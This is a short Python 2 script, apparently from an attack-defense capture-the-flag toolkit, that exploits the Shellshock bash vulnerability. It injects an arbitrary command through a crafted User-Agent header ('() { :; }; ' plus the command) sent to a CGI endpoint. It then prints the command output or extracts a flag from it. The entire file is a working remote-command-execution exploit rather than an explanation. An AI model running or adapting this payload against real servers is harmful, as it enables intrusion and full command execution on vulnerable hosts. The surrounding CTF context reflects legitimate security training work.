#!/usr/bin/env python

from http import http
from config import *
from function import *

'''
this is the payload script for vuln shellshock

'''


def attack(target,cmd,get_flag):
    is_vuln = 1
    flag = "hello world!"
    info = "success"
    reserve = 0    
    

    if check_shell(target,""):
	res = execute_shell(target,cmd)
    else:
	dump_warning(target,"check_shell failed","function.py check_shell")
	'''
	put your payload code here

	'''
	header = {"User-Agent": "() { :; }; "+cmd}
	try:
	    res = http("get",target,target_port,"/ez_web/cgi-bin/skin_api.cgi","",header)   
        except Exception,e:
	    print e
	if "500" not in res :
	    dump_error(target,"not vulnerable","1.py bashshock")

    if get_flag:
	if check_flag(res):
	    flag = res
	    print "flag => " + res.replace(" ","").replace("\n","")
	else:
	    dump_warning(target,"flag format error,you may need to rewrite the shell", "1.py attack")
    else:
	dump_success(target,"execution cmd","1.py")
	print res


    print "test for bashshock attacking......."
    return flag,is_vuln,info,reserve 




